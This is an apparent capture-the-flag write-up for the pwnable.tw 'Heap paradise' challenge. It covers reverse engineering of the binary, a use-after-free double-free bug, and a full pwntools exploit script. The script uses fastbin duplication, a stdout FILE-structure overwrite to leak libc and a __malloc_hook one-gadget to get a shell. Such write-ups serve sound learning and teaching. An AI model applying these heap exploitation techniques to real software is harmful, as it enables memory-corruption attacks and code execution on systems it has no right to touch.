---
title: Heap paradise (350 pts) - pwnable.tw
date: 2025-09-20 21:47:26
tags: ['pwnable.tw']
---

## 0x1. Initial Reconnaissance 

### file 
```
↪ file heap_paradise
heap_paradise: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0f2c77e0e0c4e37c78f827f6ae317e208bbb202a, stripped
```

### checksec
```
↪ checksec --file=heap_paradise
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	Partial	1		2		heap_paradise
```

### ./heap_paradise

```
↪ ./heap_paradise
***********************
     Heap Paradise     
***********************
 1. Allocate           
 2. Free               
 3. Exit               
***********************
You Choice:
```

## 0x2. Reverse Engineering

### main
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax

  sub_AC1();
  while ( 1 )
  {
    while ( 1 )
    {
      sub_C21();
      v3 = sub_B49();
      if ( v3 != 2 )
        break;
      sub_D8D();
    }
    if ( v3 == 3 )
      exit(0);
    if ( v3 == 1 )
      sub_C8D();
    else
      puts("Invalid Choice !");
  }
}
```

### Allocate
```c
int sub_C8D()
{
  unsigned __int64 v0; // rax
  int i; // [rsp+4h] [rbp-Ch]
  unsigned int size; // [rsp+8h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 15 )
    {
      LODWORD(v0) = puts("You can't allocate anymore !");
      return v0;
    }
    if ( !qword_202040[i] )
      break;
  }
  printf("Size :");
  v0 = sub_B49();
  size = v0;
  if ( v0 <= 0x78 )
  {
    qword_202040[i] = malloc(v0);
    if ( !qword_202040[i] )
    {
      puts("Error!");
      exit(-1);
    }
    printf("Data :");
    LODWORD(v0) = (unsigned int)sub_BAA(qword_202040[i], size);
  }
  return v0;
}
```

### free
```c
void sub_D8D()
{
  __int64 v0; // [rsp+8h] [rbp-8h]

  printf("Index :");
  v0 = sub_B49();
  if ( v0 <= 15 )
    free((void *)qword_202040[v0]);
}
```

## 0x3. Analysis

In this challenge, they allow you to allocate a size <= 0x78, 16 times and store the address into an array in bss. The most noticeable point is that you can free any chunk you want, but they do not assign the element in the array back to null after freed, thus we can use use-after-free attack to trigger double-free bug.

## 0x4. Exploit

Create 2 chunks, free the first chunk, and free the second one, then free the first chunk again, thus you can trigger double-free bug. For example I allocate two 0x68 bytes - chunks, the fastbins will be like that:

```c
0x70: chunk 1 -> chunk 2 -> chunk 1 -> chunk 2 -> chunk 1 -> ....
```

When you call malloc (0x68), they will return you the chunk1 still keeping fd pointer at chunk1 + 0x16, which is chunk2's address. As a result, you can overwrite any offset to the first byte to make fd pointer of chunk1 point to everywhere on heap. For example, I overwrite ```b'\x20'``` to the first byte, thus I will have the fastbins like that:
Because the first chunk, I allocate in this challenge, is always placed at the beginning of heap, the first byte is always null.

```c
0x70: chunk2 -> chunk1 -> chunk1 + 0x20
```


You can setup your chunks like that: 

![image](/images/chunk.jpg)
<!-- ![image](/source/images/chunk.jpg) -->

After getting your fake chunk, you can edit the size of your chunk by freeing chunk1, and malloc (0x68) again. Free your fake chunk to place it into unsortedbin. Now the fake chunk's fd points to main_arena. Change the offset of fd pointer to have a fastbin like that:

```c
0x70: chunk1 -> chunk2 -> chunk1 -> chunk1 + 0x20 -> _IO_2_1_stdout_ - 0x43
```

Now, you can overwrite ```_IO_2_1_stdout``` (an ```_IO_FILE_plus``` struct), and it will look like that before you overwrite: 

```c
pwndbg> info address _IO_2_1_stdout_ 
Symbol "_IO_2_1_stdout_" is static storage at address 0x7ffff7bc4620.


pwndbg> p *(struct _IO_FILE_plus *) 0x7ffff7bc4620
$1 = {
  file = {
    _flags = -72537977,
    _IO_read_ptr = 0x7ffff7bc46a3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7ffff7bc46a3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7ffff7bc46a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7ffff7bc46a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7ffff7bc46a3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7ffff7bc46a3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_base = 0x7ffff7bc46a3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_end = 0x7ffff7bc46a4 <_IO_2_1_stdout_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7bc38e0 <_IO_2_1_stdin_>,
    _fileno = 1,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "\n",
    _lock = 0x7ffff7bc5780 <_IO_stdfile_1_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7bc37a0 <_IO_wide_data_1>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7bc26e0 <__GI__IO_file_jumps>
}
```

Set the flags to ```(_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING)```, they will print everything in the address stored in ```_IO_write_base```, when ```puts()``` or ```printf()``` are called, you will get the libc address. Then, just do as usual to get the shell. All of this cost me 16 chunks :DD.


### Exploit

```py
from pwn import *

exe = ELF("./heap_paradise_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214")
    else:
        r = remote("chall.pwnable.tw", 10308)

    return r

def allocate (p, size, content):
    p.sendafter (b'You Choice:', b'1')
    p.sendafter (b'Size :', size)
    p.sendafter (b'Data :', content)

def free (p, id):
    p.sendafter (b'You Choice:', b'2')
    p.sendafter (b'Index :', id)


def main():
    p = conn()
    allocate (p, b'104', p64 (0) * 3 + p64 (0x71)) # 0 
    allocate (p, b'104', p64 (0) * 3 + p64 (0x31) + b'\x00' * 16 * 2 + p64 (0) + p64 (0x21)) # 1
    free (p, b'0')
    free (p, b'1')
    free (p, b'0')
    allocate (p, b'104', b'\x20') # 2
    allocate (p, b'104', p64 (0) * 2) # 3
    allocate (p, b'104', p64 (0) * 2) # 4
    allocate (p, b'104', b'ndd') # 5 fake chunk
    free (p, b'0')
    allocate (p, b'104', p64 (0) * 3 + p64 (0xa1)) # 6 
    free (p, b'5')

    ### change the fd pointer of chunk (in unsortedbin) to _IO_2_1_stdout_
    free (p, b'0')
    allocate (p, b'104', p64 (0) * 3 + p64 (0x71) + b'\xdd\x45') # 7
    
    ### Attack _IO_2_1_stdout_
    print ("Attack _IO_2_1_stdout_ -----------------------------------------------------------------------------")
    free (p, b'0')
    free (p, b'1')
    free (p, b'0')
    allocate (p, b'104', b'\x20') # 8
    allocate (p, b'104', p64 (0) * 2) # 9
    allocate (p, b'104', p64 (0) * 2) # 10
    allocate (p, b'104', b'dd') # 11

    _IO_MAGIC = 0xfbad0000
    _IO_IS_APPENDING = 0x1000
    _IO_CURRENTLY_PUTTING = 0x800
    print ("The value of _IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING is: ", (_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING))
    allocate (p, b'104', b'\x00' * 0x33 + p64 (_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING) + p64 (0) * 3 + b'\xa0\x3b') # 12

    libc.address = u64 (p.recv (6) + b'\x00' * 2) - libc.symbols['main_arena'] - 104
    print ("The libc address is: ", hex (libc.address))

    ## get shell

    print ("Get shell ---------------------------------------------------------------------------------")

    free (p, b'5')
    free (p, b'0')
    allocate (p, b'104', p64 (0) * 3 + p64 (0x71) + p64(libc.sym['__malloc_hook'] - 0x23)) # 13
    allocate (p, b'104', b'ndd') # 14
    allocate (p, b'104', b'\x00' * 0x13 + p64 (libc.address + 0xef6c4)) # 15
    free (p, b'0')
    free (p, b'0')

    p.interactive()


if __name__ == "__main__":
    main()
```